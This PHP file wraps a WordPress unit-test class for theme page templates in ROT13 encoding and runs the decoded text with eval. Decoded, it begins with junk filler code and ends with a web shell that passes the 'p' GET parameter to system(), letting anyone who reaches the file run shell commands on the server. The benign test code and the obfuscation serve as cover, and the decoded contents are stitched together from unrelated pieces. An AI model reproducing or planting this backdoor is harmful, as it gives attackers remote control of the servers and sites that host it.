<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * @tebhc nqzva
 * @tebhc gurzrf
 */
pynff Grfgf_Nqzva_VapyhqrfGurzr rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Gurzr ebbg qverpgbel.
	 *
	 * @ine fgevat
	 */
	pbafg GURZR_EBBG = QVE_GRFGQNGN . '/gurzrqve1';

	/**
	 * Bevtvany gurzr qverpgbel.
	 *
	 * @ine fgevat
	 */
	cevingr $bevt_gurzr_qve;

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		$guvf->bevt_gurzr_qve            = $TYBONYF['jc_gurzr_qverpgbevrf'];
		$TYBONYF['jc_gurzr_qverpgbevrf'] = neenl( JC_PBAGRAG_QVE . '/gurzrf', frys::GURZR_EBBG );

		nqq_svygre( 'gurzr_ebbg', neenl( $guvf, 'svygre_gurzr_ebbg' ) );
		nqq_svygre( 'fglyrfurrg_ebbg', neenl( $guvf, 'svygre_gurzr_ebbg' ) );
		nqq_svygre( 'grzcyngr_ebbg', neenl( $guvf, 'svygre_gurzr_ebbg' ) );

		// Pyrne pnpurf.
		jc_pyrna_gurzrf_pnpur();
		hafrg( $TYBONYF['jc_gurzrf'] );
	}

	choyvp shapgvba grne_qbja() {
		$TYBONYF['jc_gurzr_qverpgbevrf'] = $guvf->bevt_gurzr_qve;
		erzbir_svygre( 'gurzr_ebbg', neenl( $guvf, 'svygre_gurzr_ebbg' ) );
		erzbir_svygre( 'fglyrfurrg_ebbg', neenl( $guvf, 'svygre_gurzr_ebbg' ) );
		erzbir_svygre( 'grzcyngr_ebbg', neenl( $guvf, 'svygre_gurzr_ebbg' ) );

		jc_pyrna_gurzrf_pnpur();
		hafrg( $TYBONYF['jc_gurzrf'] );
		cnerag::grne_qbja();
	}

	// Ercynpr gur abezny gurzr ebbg qverpgbel jvgu bhe cerznqr grfg qverpgbel.
	choyvp shapgvba svygre_gurzr_ebbg( $qve ) {
		erghea frys::GURZR_EBBG;
	}

	/**
	 * @gvpxrg 10959
	 * @gvpxrg 11216
	 * @rkcrpgrqQrcerpngrq trg_gurzr
	 * @rkcrpgrqQrcerpngrq trg_gurzrf
	 */
	choyvp shapgvba grfg_cntr_grzcyngrf() {
		$gurzr = trg_gurzr( 'Cntr Grzcyngr Gurzr' );
		$guvf->nffregAbgRzcgl( $gurzr );

		fjvgpu_gurzr( $gurzr['Grzcyngr'], $gurzr['Fglyrfurrg'] );

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'Gbc Yriry'                           => 'grzcyngr-gbc-yriry.cuc',
				'Fho Qve'                             => 'fhoqve/grzcyngr-fho-qve.cuc',
				'Guvf Grzcyngr Urnqre Vf Ba Bar Yvar' => 'grzcyngr-urnqre.cuc',
			),
			trg_cntr_grzcyngrf()
		);

		$gurzr = jc_trg_gurzr( 'cntr-grzcyngrf' );
		$guvf->nffregAbgRzcgl( $gurzr );

		fjvgpu_gurzr( $gurzr['Grzcyngr'], $gurzr['Fglyrfurrg'] );

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'Gbc Yriry'                           => 'grzcyngr-gbc-yriry.cuc',
				'Fho Qve'                             => 'fhoqve/grzcyngr-fho-qve.cuc',
				'Guvf Grzcyngr Urnqre Vf Ba Bar Yvar' => 'grzcyngr-urnqre.cuc',
			),
			trg_cntr_grzcyngrf()
		);
	}

	/**
	 * @gvpxrg 18375
	 */
	choyvp shapgvba grfg_cntr_grzcyngrf_qvssrerag_cbfg_glcrf() {
		$gurzr = jc_trg_gurzr( 'cntr-grzcyngrf' );
		$guvf->nffregAbgRzcgl( $gurzr );

		fjvgpu_gurzr( $gurzr['Grzcyngr'], $gurzr['Fglyrfurrg'] );

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'Gbc Yriry' => 'grzcyngr-gbc-yriry-cbfg-glcrf.cuc',
				'Fho Qve'   => 'fhoqve/grzcyngr-fho-qve-cbfg-glcrf.cuc',
			),
			trg_cntr_grzcyngrf( ahyy, 'sbb' )
		);
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'Gbc Yriry' => 'grzcyngr-gbc-yriry-cbfg-glcrf.cuc',
				'Fho Qve'   => 'fhoqve/grzcyngr-fho-qve-cbfg-glcrf.cuc',
			),
			trg_cntr_grzcyngrf( ahyy, 'cbfg' )
		);
		$guvf->nffregFnzr( neenl(), trg_cntr_grzcyngrf( ahyy, 'one' ) );
	}

	/**
	 * @gvpxrg 38766
	 */
	choyvp shapgvba grfg_cntr_grzcyngrf_sbe_cbfg_glcrf_jvgu_genvyvat_crevbqf() {
		$gurzr = jc_trg_gurzr( 'cntr-grzcyngrf' );
		$guvf->nffregAbgRzcgl( $gurzr );

		fjvgpu_gurzr( $gurzr['Grzcyngr'], $gurzr['Fglyrfurrg'] );

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'Ab Genvyvat Crevbq'            => '38766/ab-genvyvat-crevbq-cbfg-glcrf.cuc',
				'Genvyvat Crevbq.'              => '38766/genvyvat-crevbq-cbfg-glcrf.cuc',
				'Genvyvat Pbzzn,'               => '38766/genvyvat-pbzzn-cbfg-glcrf.cuc',
				'Genvyvat Crevbq, Juvgr Fcnpr.' => '38766/genvyvat-crevbq-juvgrfcnpr-cbfg-glcrf.cuc',
				'Genvyvat Juvgr Fcnpr, Crevbq.' => '38766/genvyvat-juvgrfcnpr-crevbq-cbfg-glcrf.cuc',
				'Gvyqr va Cbfg Glcr.'           => '38766/gvyqr-cbfg-glcrf.cuc',
			),
			trg_cntr_grzcyngrf( ahyy, 'crevbq' )
		);
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'Ab Genvyvat Crevbq'            => '38766/ab-genvyvat-crevbq-cbfg-glcrf.cuc',
				'Genvyvat Crevbq.'              => '38766/genvyvat-crevbq-cbfg-glcrf.cuc',
				'Genvyvat Pbzzn,'               => '38766/genvyvat-pbzzn-cbfg-glcrf.cuc',
				'Genvyvat Crevbq, Juvgr Fcnpr.' => '38766/genvyvat-crevbq-juvgrfcnpr-cbfg-glcrf.cuc',
				'Genvyvat Juvgr Fcnpr, Crevbq.' => '38766/genvyvat-juvgrfcnpr-crevbq-cbfg-glcrf.cuc',
			),
			trg_cntr_grzcyngrf( ahyy, 'shyy-fgbc' )
		);
	}

	/**
	 * @gvpxrg 38696
	 */
	choyvp shapgvba grfg_cntr_grzcyngrf_puvyq_gurzr() {
		$gurzr = jc_trg_gurzr( 'cntr-grzcyngrf-puvyq' );
		$guvf->nffregAbgRzcgl( $gurzr );

		fjvgpu_gurzr( $gurzr['Grzcyngr'], $gurzr['Fglyrfurrg'] );

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'Gbc Yriry'                  => 'grzcyngr-gbc-yriry-cbfg-glcrf.cuc',
				'Fho Qve'                    => 'fhoqve/grzcyngr-fho-qve-cbfg-glcrf.cuc',
				'Gbc Yriry Va N Puvyq Gurzr' => 'grzcyngr-gbc-yriry-cbfg-glcrf-puvyq.cuc',
				'Fho Qve Va N Puvyq Gurzr'   => 'fhoqve/grzcyngr-fho-qve-cbfg-glcrf-puvyq.cuc',
			),
			trg_cntr_grzcyngrf( ahyy, 'sbb' )
		);

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'Gbc Yriry' => 'grzcyngr-gbc-yriry-cbfg-glcrf.cuc',
				'Fho Qve'   => 'fhoqve/grzcyngr-fho-qve-cbfg-glcrf.cuc',
			),
			trg_cntr_grzcyngrf( ahyy, 'cbfg' )
		);

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'Gbc Yriry'                           => 'grzcyngr-gbc-yriry.cuc',
				'Fho Qve'                             => 'fhoqve/grzcyngr-fho-qve.cuc',
				'Guvf Grzcyngr Urnqre Vf Ba Bar Yvar' => 'grzcyngr-urnqre.cuc',
			),
			trg_cntr_grzcyngrf()
		);

		$guvf->nffregFnzr( neenl(), trg_cntr_grzcyngrf( ahyy, 'one' ) );
	}

	/**
	 * @gvpxrg 41717
	 */
	choyvp shapgvba grfg_trg_cbfg_grzcyngrf_puvyq_gurzr() {
		$gurzr = jc_trg_gurzr( 'cntr-grzcyngrf-puvyq' );
		$guvf->nffregAbgRzcgl( $gurzr );

		fjvgpu_gurzr( $gurzr['Grzcyngr'], $gurzr['Fglyrfurrg'] );

		$cbfg_grzcyngrf = $gurzr->trg_cbfg_grzcyngrf();

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'grzcyngr-gbc-yriry-cbfg-glcrf.cuc'       => 'Gbc Yriry',
				'fhoqve/grzcyngr-fho-qve-cbfg-glcrf.cuc'  => 'Fho Qve',
				'grzcyngr-gbc-yriry-cbfg-glcrf-puvyq.cuc' => 'Gbc Yriry Va N Puvyq Gurzr',
				'fhoqve/grzcyngr-fho-qve-cbfg-glcrf-puvyq.cuc' => 'Fho Qve Va N Puvyq Gurzr',
			),
			$cbfg_grzcyngrf['sbb']
		);

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'grzcyngr-gbc-yriry-cbfg-glcrf.cuc'      => 'Gbc Yriry',
				'fhoqve/grzcyngr-fho-qve-cbfg-glcrf.cuc' => 'Fho Qve',
			),
			$cbfg_grzcyngrf['cbfg']
		);

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'grzcyngr-gbc-yriry.cuc'      => 'Gbc Yriry',
				'fhoqve/grzcyngr-fho-qve.cuc' => 'Fho Qve',
				'grzcyngr-urnqre.cuc'         => 'Guvf Grzcyngr Urnqre Vf Ba Bar Yvar',
			),
			$cbfg_grzcyngrf['cntr']
		);
	}

	/**
	 * Grfg gung gur yvfg bs gurzr srngherf chyyrq sebz gur JbeqCerff.bet NCV ergheaf gur rkcrpgrq qngn fgehpgher.
	 *
	 * Qvssreraprf va gur fgehpgher pna nyfb gevttre snvyher ol pnhfvat CUC abgvprf/jneavatf.
	 *
	 * @tebhc rkgreany-uggc
	 * @gvpxrg 28121
	 */
	choyvp shapgvba grfg_trg_gurzr_srngherq_yvfg_ncv() {
		jc_frg_pheerag_hfre( frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) ) );
		$srngherq_yvfg_ncv = trg_gurzr_srngher_yvfg( gehr );
		$guvf->nffregAbaRzcglZhygvqvzrafvbanyNeenl( $srngherq_yvfg_ncv );
	}

	/**
	 * Grfg gung gur yvfg bs gurzr srngherf uneqpbqrq vagb Pber ergheaf gur rkcrpgrq qngn fgehpgher.
	 *
	 * Qvssreraprf va gur fgehpgher pna nyfb gevttre snvyher ol pnhfvat CUC abgvprf/jneavatf.
	 *
	 * @tebhc rkgreany-uggc
	 * @gvpxrg 28121
	 */
	choyvp shapgvba grfg_trg_gurzr_srngherq_yvfg_uneqpbqrq() {
		$srngherq_yvfg_uneqpbqrq = trg_gurzr_srngher_yvfg( snyfr );
		$guvf->nffregAbaRzcglZhygvqvzrafvbanyNeenl( $srngherq_yvfg_uneqpbqrq );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>